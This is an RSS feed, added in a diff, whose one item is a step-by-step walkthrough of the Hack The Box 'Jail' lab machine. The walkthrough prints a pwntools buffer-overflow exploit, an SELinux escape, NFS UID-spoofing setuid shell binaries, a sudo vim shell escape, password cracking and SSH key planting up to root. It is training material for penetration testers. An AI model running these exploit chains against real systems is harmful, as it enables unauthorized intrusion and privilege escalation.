@@ -1,0 +1,207 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Source-Code-Analysis on VAPT Walkthroughs</title><link>https://malayamanas.github.io/tags/source-code-analysis/</link><description>Recent content in Source-Code-Analysis on VAPT Walkthroughs</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 22 Sep 2025 11:00:00 +0000</lastBuildDate><atom:link href="https://malayamanas.github.io/tags/source-code-analysis/index.xml" rel="self" type="application/rss+xml"/><item><title>Jail HTB - Medium Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/jail-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 11:00:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/jail-htb-walkthrough/</guid><description>&lt;h1 id="jail-htb---medium-linux-box-walkthrough"&gt;Jail HTB - Medium Linux Box Walkthrough&lt;/h1&gt;
+&lt;h2 id="key-exploitation-steps-and-techniques"&gt;Key Exploitation Steps and Techniques&lt;/h2&gt;
+&lt;p&gt;Below is a chronological extraction of the key exploitation steps and techniques used to compromise the &amp;ldquo;Jail&amp;rdquo; machine from Hack The Box, as described in the provided data. The process involves multiple stages, including initial enumeration, exploiting vulnerabilities, and privilege escalation.&lt;/p&gt;
+&lt;h3 id="key-exploitation-steps-and-techniques-chronological-order"&gt;Key Exploitation Steps and Techniques (Chronological Order)&lt;/h3&gt;
+&lt;h3 id="1-initial-network-enumeration-nmap-scans"&gt;1. Initial Network Enumeration (Nmap Scans)&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Port scanning with Nmap to identify open ports and services.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Perform an all-ports scan: &lt;code&gt;nmap -p- -oA allports [TARGET-IP]&lt;/code&gt; to identify open ports.&lt;/li&gt;
+&lt;li&gt;Conduct a detailed scan on identified ports (22, 80, 111, 7411, 2048) with version detection and safe scripts: &lt;code&gt;nmap -sC -sV -oA basic_scripts -p 22,80,111,7411,2048 [TARGET-IP]&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Findings&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Port 80: Apache 2.4.6 (CentOS), indicating CentOS 7.&lt;/li&gt;
+&lt;li&gt;Port 111: NFS version 3, vulnerable to user ID spoofing.&lt;/li&gt;
+&lt;li&gt;Port 2048: Likely related to NFS (mountd).&lt;/li&gt;
+&lt;li&gt;Port 7411: Unknown service, later identified as a custom application.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="2-web-server-enumeration"&gt;2. Web Server Enumeration&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Manual web browsing and directory enumeration with Gobuster.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Access the web server at &lt;code&gt;http://[TARGET-IP]&lt;/code&gt;. No significant content found in the main page or &lt;code&gt;robots.txt&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Run Gobuster to enumerate directories: &lt;code&gt;gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://[TARGET-IP] -o gobuster.log -t 25&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Findings&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Discovered &lt;code&gt;/jailuser/dev/&lt;/code&gt; directory containing three files: &lt;code&gt;compile.sh&lt;/code&gt;, &lt;code&gt;jail&lt;/code&gt; (binary), and &lt;code&gt;jail.c&lt;/code&gt; (source code).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="3-source-code-analysis-jailc"&gt;3. Source Code Analysis (jail.c)&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Manual code review to identify vulnerabilities.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Download files from &lt;code&gt;/jailuser/dev/&lt;/code&gt; using &lt;code&gt;wget -r http://[TARGET-IP]/jailuser/dev/&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Analyze &lt;code&gt;jail.c&lt;/code&gt; source code, identifying:
+&lt;ul&gt;
+&lt;li&gt;A buffer overflow vulnerability in &lt;code&gt;strcpy&lt;/code&gt;, copying a 256-byte &lt;code&gt;password&lt;/code&gt; buffer into a 16-byte &lt;code&gt;userpass&lt;/code&gt; buffer.&lt;/li&gt;
+&lt;li&gt;Hard-coded credentials: username &lt;code&gt;admin&lt;/code&gt;, password &lt;code&gt;1974jailbreak&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Debug mode that leaks memory addresses when enabled.&lt;/li&gt;
+&lt;li&gt;The application listens on port 7411 for socket-based communication.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Review &lt;code&gt;compile.sh&lt;/code&gt;, noting flags &lt;code&gt;-m32&lt;/code&gt; (32-bit binary) and &lt;code&gt;-z execstack&lt;/code&gt; (disables stack protection).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="4-buffer-overflow-exploitation-setup"&gt;4. Buffer Overflow Exploitation Setup&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Setting up a local CentOS 7 environment to mimic the target for reliable exploit development.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Set up a CentOS 7 box and transfer &lt;code&gt;jail.c&lt;/code&gt; and &lt;code&gt;compile.sh&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Modify &lt;code&gt;compile.sh&lt;/code&gt; to include &lt;code&gt;-g&lt;/code&gt; flag for debugging symbols: &lt;code&gt;gcc -m32 -z execstack -g jail.c -o jail&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Run the binary and attach GDB: &lt;code&gt;ps aux | grep jail&lt;/code&gt; to get PID, then &lt;code&gt;gdb --pid &amp;lt;PID&amp;gt;&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Configure GDB: Set &lt;code&gt;follow-fork-mode&lt;/code&gt; to &lt;code&gt;child&lt;/code&gt; and &lt;code&gt;detach-on-fork&lt;/code&gt; to &lt;code&gt;off&lt;/code&gt; to track child processes.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="5-buffer-overflow-exploit-development"&gt;5. Buffer Overflow Exploit Development&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Crafting a buffer overflow exploit using Pwntools to gain a shell.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Connect to the service on port 7411: &lt;code&gt;nc [LOCAL-IP] 7411&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Enable debug mode: Send &lt;code&gt;debug&lt;/code&gt;, &lt;code&gt;user admin&lt;/code&gt;, and &lt;code&gt;pass &amp;lt;payload&amp;gt;&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Identify the buffer overflow offset using a cyclic pattern (50 bytes) generated by &lt;code&gt;pwntools&lt;/code&gt;: &lt;code&gt;pwn cyclic 50&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Use GDB to find the offset (28 bytes) where EIP is overwritten: &lt;code&gt;pwn cyclic -l &amp;lt;value&amp;gt;&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Leak the &lt;code&gt;userpass&lt;/code&gt; buffer address in debug mode.&lt;/li&gt;
+&lt;li&gt;Craft exploit skeleton with Pwntools:
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; pwn &lt;span style="color:#f92672"&gt;import&lt;/span&gt; &lt;span style="color:#f92672"&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;context(os&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;, arch&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;host, port &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;[TARGET-IP]&amp;#39;&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;7411&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;p &lt;span style="color:#f92672"&gt;=&lt;/span&gt; remote(host, port)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;p&lt;span style="color:#f92672"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#e6db74"&gt;&amp;#39;OK Ready&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;p&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sendline(&lt;span style="color:#e6db74"&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;p&lt;span style="color:#f92672"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#e6db74"&gt;&amp;#39;OK Debug mode on&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;p&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sendline(&lt;span style="color:#e6db74"&gt;&amp;#39;user admin&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;p&lt;span style="color:#f92672"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#e6db74"&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;*&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;28&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; p32(&lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt;leaked_address&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;32&lt;/span&gt;) &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\xcc&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;*&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;20&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;p&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sendline(payload)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;Initially attempt a reverse TCP shellcode, but it fails due to iptables blocking reverse shells.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="6-socket-reuse-shellcode"&gt;6. Socket Reuse Shellcode&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Use socket reuse shellcode to bypass iptables restrictions.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Replace reverse shellcode with socket reuse shellcode (smaller, reuses existing connection).&lt;/li&gt;
+&lt;li&gt;Modify exploit to include socket reuse shellcode and enter interactive mode: &lt;code&gt;p.interactive()&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Execute exploit: &lt;code&gt;python exploit.py&lt;/code&gt;, gaining a shell as &lt;code&gt;nobody&lt;/code&gt; in an SELinux sandbox.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="7-selinux-sandbox-escape"&gt;7. SELinux Sandbox Escape&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Exploit a command injection vulnerability in SELinux (referenced CVE).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Research SELinux escape techniques via Reddit (&lt;code&gt;site:reddit.com/r/netsec selinux escape&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;Identify a CVE exploiting terminal input buffer stuffing post-sandbox execution.&lt;/li&gt;
+&lt;li&gt;Compile and execute the SELinux bypass exploit:
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;gcc sebypass_id.c -o sebypass_id
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;chmod &lt;span style="color:#ae81ff"&gt;4755&lt;/span&gt; sebypass_id
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;./sebypass_id
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;Gain a shell as user &lt;code&gt;frank&lt;/code&gt; (effective UID 1000).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="8-nfs-user-id-spoofing"&gt;8. NFS User ID Spoofing&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Exploit NFS version 3 user ID spoofing to create a setuid binary.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Enumerate NFS shares: &lt;code&gt;showmount -e [TARGET-IP]&lt;/code&gt;, revealing &lt;code&gt;/opt&lt;/code&gt; and &lt;code&gt;/var/nfs_share&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Mount NFS shares locally: &lt;code&gt;mount -t nfs -o vers=3 [TARGET-IP]:/opt /mnt/jail/opt&lt;/code&gt; and &lt;code&gt;mount -t nfs -o vers=3 [TARGET-IP]:/var/nfs_share /mnt/jail/nfs_share&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Modify local user UID to 1000 (matching &lt;code&gt;frank&lt;/code&gt;): Edit &lt;code&gt;/etc/passwd&lt;/code&gt; and &lt;code&gt;/etc/group&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Create a setuid binary:
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;void&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;setuid&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;setgid&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;system&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/usr/bin/id&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;Compile: &lt;code&gt;gcc -o tip_id tip_id.c&lt;/code&gt;, set permissions: &lt;code&gt;chmod 4755 tip_id&lt;/code&gt;, and copy to &lt;code&gt;/var/nfs_share&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Execute on the target to verify UID 1000 access.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="9-ssh-key-deployment"&gt;9. SSH Key Deployment&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Use NFS write access to deploy an SSH key for &lt;code&gt;frank&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Generate SSH key pair: &lt;code&gt;ssh-keygen -f ~/htb/boxes/jail/frank_key&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Write the public key to &lt;code&gt;/var/nfs_share/.key&lt;/code&gt; using the setuid binary.&lt;/li&gt;
+&lt;li&gt;Copy to &lt;code&gt;/home/frank/.ssh/authorized_keys&lt;/code&gt; on the target.&lt;/li&gt;
+&lt;li&gt;SSH as &lt;code&gt;frank&lt;/code&gt;: &lt;code&gt;ssh -i frank_key frank@[TARGET-IP]&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="10-privilege-escalation-to-adm-user"&gt;10. Privilege Escalation to &lt;code&gt;adm&lt;/code&gt; User&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Exploit &lt;code&gt;sudo&lt;/code&gt; misconfiguration allowing &lt;code&gt;frank&lt;/code&gt; to run &lt;code&gt;vim&lt;/code&gt; as &lt;code&gt;adm&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Check &lt;code&gt;sudo&lt;/code&gt; privileges: &lt;code&gt;sudo -l&lt;/code&gt;, revealing &lt;code&gt;frank&lt;/code&gt; can run &lt;code&gt;vim /opt/logreader/logread.sh&lt;/code&gt; as &lt;code&gt;adm&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Run &lt;code&gt;sudo -u adm vim /opt/logreader/logread.sh&lt;/code&gt;, enter &lt;code&gt;:python import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&lt;/code&gt; to spawn a shell as &lt;code&gt;adm&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="11-privilege-escalation-to-root"&gt;11. Privilege Escalation to &lt;code&gt;root&lt;/code&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Crack an encrypted RAR file and recover the root SSH key.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Find encrypted file &lt;code&gt;/var/adm/keys.rar&lt;/code&gt; and note in &lt;code&gt;/var/adm/note.txt&lt;/code&gt;: Password format is &lt;code&gt;&amp;lt;lastname&amp;gt;&amp;lt;4digits&amp;gt;&amp;lt;symbol&amp;gt;&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Identify &lt;code&gt;frank&lt;/code&gt; as Frank Morris (from Alcatraz escape reference).&lt;/li&gt;
+&lt;li&gt;Generate a wordlist with Hashcat: &lt;code&gt;./hashcat --stdout -a 3 Morris19?d?d? -o /root/john.jail.words&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Crack RAR password with John the Ripper: &lt;code&gt;john --wordlist=/root/john.jail.words /root/jail.hash&lt;/code&gt;, revealing &lt;code&gt;Morris1962!&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Extract &lt;code&gt;root_authorized_ssh_key.pub&lt;/code&gt; from &lt;code&gt;keys.rar&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;opt-ssh-ctf-tool&lt;/code&gt; to derive the private key via the Wiener attack: &lt;code&gt;opt-ssh-ctf-tool --publickey root_authorized_ssh_key.pub --private --verbose&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;SSH as &lt;code&gt;root&lt;/code&gt;: &lt;code&gt;ssh -i root_key root@[TARGET-IP]&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="12-alternative-privilege-escalation-to-adm-unintended"&gt;12. Alternative Privilege Escalation to &lt;code&gt;adm&lt;/code&gt; (Unintended)&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Exploit NFS share permissions to create a setuid binary for &lt;code&gt;adm&lt;/code&gt; (UID 3).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Verify NFS share &lt;code&gt;/var/nfs_share&lt;/code&gt; is mounted and writable by &lt;code&gt;frank&lt;/code&gt; (UID 1000).&lt;/li&gt;
+&lt;li&gt;Create a directory with full permissions: &lt;code&gt;mkdir /var/nfs_share/ipsec; chmod 777 /var/nfs_share/ipsec&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Change local user UID to 3 (matching &lt;code&gt;adm&lt;/code&gt;): Edit &lt;code&gt;/etc/passwd&lt;/code&gt; and &lt;code&gt;/etc/group&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Create a setuid binary:
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;void&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;setuid&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;3&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;setgid&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;3&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;execl&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;bash&amp;#34;&lt;/span&gt;, NULL);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;Compile: &lt;code&gt;gcc suid.c -o suid&lt;/code&gt;, set permissions: &lt;code&gt;chmod 6755 suid&lt;/code&gt;, and copy to &lt;code&gt;/var/nfs_share/ipsec&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Execute on the target to gain a shell as &lt;code&gt;adm&lt;/code&gt; (effective UID 3).&lt;/li&gt;
+&lt;li&gt;Use the setuid binary to append an SSH key to &lt;code&gt;/var/adm/.ssh/authorized_keys&lt;/code&gt; non-destructively: &lt;code&gt;echo &amp;lt;pubkey&amp;gt; | ./suid -a /var/adm/.ssh/authorized_keys&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="summary-of-techniques"&gt;Summary of Techniques&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;: Nmap, Gobuster, manual web browsing, &lt;code&gt;showmount&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Vulnerability Exploitation&lt;/strong&gt;: Buffer overflow in &lt;code&gt;jail.c&lt;/code&gt;, NFS user ID spoofing, SELinux command injection, &lt;code&gt;sudo&lt;/code&gt; misconfiguration, RAR password cracking, RSA private key recovery.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Key Tools&lt;/strong&gt;: Nmap, Gobuster, GDB, Pwntools, John the Ripper, Hashcat, &lt;code&gt;opt-ssh-ctf-tool&lt;/code&gt;, GCC.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Privilege Escalation Path&lt;/strong&gt;: &lt;code&gt;nobody&lt;/code&gt; (via buffer overflow) → &lt;code&gt;frank&lt;/code&gt; (via SELinux escape) → &lt;code&gt;adm&lt;/code&gt; (via &lt;code&gt;sudo vim&lt;/code&gt; or NFS setuid) → &lt;code&gt;root&lt;/code&gt; (via RAR cracking and SSH key).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This sequence reflects the chained exploits required to fully compromise the &amp;ldquo;Jail&amp;rdquo; machine, including both intended and unintended methods for privilege escalation.&lt;/p&gt;</description></item></channel></rss>
